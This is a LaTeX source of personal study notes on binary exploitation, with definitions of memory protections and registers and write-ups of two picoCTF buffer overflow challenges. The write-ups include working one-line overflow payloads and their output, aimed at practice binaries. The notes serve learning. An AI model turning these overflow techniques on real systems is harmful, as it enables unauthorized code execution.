\documentclass{article}
\title{Binary Exploitation Journey}
\author{b0th}
\date{May 25, 2020}

\usepackage{geometry}
\geometry{legalpaper, margin=1.2in}

\usepackage{hyperref}
\hypersetup{
    colorlinks=true,
    linkcolor=cyan,
    filecolor=blue,      
    urlcolor=cyan,
}

\usepackage{xcolor}
\usepackage{framed}
\definecolor{shadecolor}{RGB}{200,200,200}

\begin{document}
\maketitle

\section{Terms}
\subsection{Technicals}

\begin{description}
\item [ASLR (Address Space Layout Randomization)] Security measure in modern OSes to randomize stack and libc addresses on each program execution. 
\item [Binary] A binary is the output file from compiling a C or C++ file. Anything in the binary has a constant address (usually... see PIE.)
\item [Canary] A canary is some (usually random) value that is used to verify that nothing has been overrwritten. Programs may place canaries in memory, and check that they still have the exact same value after running potentially dangerous code, verifying the integrity of that memory.
\item [GOT (Global Offset Table)]  The GOT is a table of addresses stored in the data section of memory. Executed programs use it to look up the runtime addresses of global variables that are unknown at compile time.
\item [Heap] The heap is a far more reliable memory space similar to the stack. However, usage of the heap has to be invoked by the coder, so heap problems are often their own category of exploitation
\item [NX (Non-Executable)] Security measure in modern OSes to separate processor instructions (code) and data (everything that's not code.) This prevents memory from being both executable and writable.
\item [PIE (Position Independent Executable)] Essentially ASLR, but for the binary itself. When this protection is enabled, locations of actual code in the binary are randomized.
\item [PLT (Procedure Linkage Table)] The PLT is essentially a wrapper function for all functions directly called in the binary. Only used in dynamically linked binaries.
\item [ROP (Return Oriented Programming)] Reusing tiny bits of code throughout the binary to construct commands we want to execute.
\item [Stack] The stack is part of the memory for a binary. Local variables and pointers are often stored here. The stack can be randomized.

\end{description}

\subsection{Generals}

\begin{description}
\item [Arbitrary] This word is used to imply the fullness of control that you might have given an exploit. If you've achieved arbitrary code execution, that means you can run, read, or write whatever commands you choose.
\item [Reliable] Reliable in the context of binary exploitation is almost exactly the same as regular use. An exploit is said to be reliable if it works across different runs consistently. It might seem dumb to define this work, but somtimes with exploits you will only have the option to make an unreliable exploit.
\end{description}

\section{Registers}

Processor operations mostly involve processing data. This data can be stored in memory and accessed from thereon. However, reading data from and storing data into memory slows down the processor, as it involves complicated processes of sending the data request across the control bus and into the memory storage unit and getting the data through the same channel.

\begin{description}
\item [Register] Internal memory storage location
\end{description}

The registers store data elements for processing without having to access the memory. A limited number of registers are built into the processor chip.

\section{General Registers}

This sort of register is divided into 3 groups:
\begin{itemize}
	\item \textbf{Data} registers
	\item \textbf{Pointer} registers
	\item \textbf{Index} registers
\end{itemize}

\subsection{Data Registers}

\begin{description}
	\item [Accumulator] EAX(32 bit)\textrightarrow AX(16 bit)\textrightarrow AH(8 bit) + AL(8 bit)
	\item [Base] EBX(32 bit)\textrightarrow BX(16 bit)\textrightarrow BH(8 bit) + BL(8 bit)
	\item [Counter] ECX(32 bit)\textrightarrow CX(16 bit)\textrightarrow CH(8 bit) + CL(8 bit)
	\item [Data]  EDX(32 bit)\textrightarrow DX(16 bit)\textrightarrow DH(8 bit) + DL(8 bit)
\end{description}

\textbf{Usage}: Arithmetic, logical and operations 
\subsection{Pointer Registers}

todo...

\section{Experiences}
\textit{flag.txt} content\textrightarrow ``b0th".

\subsection{Buffer Overflow 0}

Links:
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln}{Binary}
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln.c}{Source}

To solve this challenge, just understand that in this program the segmentation fault calls the \textit{sigsegv\_handler} function. This function reads the content of \textit{flag.txt}.

\begin{snugshade*}
\ttfamily
./vuln \$(python -c "print 'A'*30")

b0th
\end{snugshade*}

\subsection{Buffer Overflow 1
}
Links: 
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln}{Binary}
\href{https://tcode2k16.github.io/blog/picoctf-2018-writeup/Binary%20Exploitation/buffer%20overflow%201/vuln.c}{Source}

We have buffer size of 32 bytes, and we want to jump to the win function. This program is using \textit{gets()} which is dangerous because it doesnt check the string lenght. So we know it will be easier to overwrite the return adress of \textit{vuln()} function.

Function win adress : \ttfamily 0x080485cb \rmfamily

This function read \textit{flag.txt} too.
\begin{snugshade*}
\ttfamily
python -c "print 'A'*44 + '\textbackslash xcb\textbackslash x85\textbackslash x04\textbackslash x08'" | ./vuln

Please enter your string: 

Okay, time to return... Fingers Crossed... Jumping to 0x80485cb

b0th

Erreur de segmentation
\end{snugshade*}

\section{Notes}
\begin{enumerate}
	\item Segmentation fault means it tried to acces an adress that doesnt even exist.
	\item However, \textit{vuln()} needs to know where to return to in \textit{main()} when it finishes. This is called a return address. It is supposed to go to the instruction right after \textit{main()} calls \textit{vuln()}. When we get a segmentation fault, that means that we've overwritten the return address. Representation of a stack part from a vuln program using \textit{strcpy()} function:

\begin{snugshade*}
\ttfamily
0x080484f2 <+16>:    mov    %eax,(%esp)

0x080484f5 <+19>:    call   0x8048360 <strcpy@plt>

0x080484fa <+24>:    leave

0x080484fb <+25>:    ret
\end{snugshade*}

\end{enumerate}

\end{document}

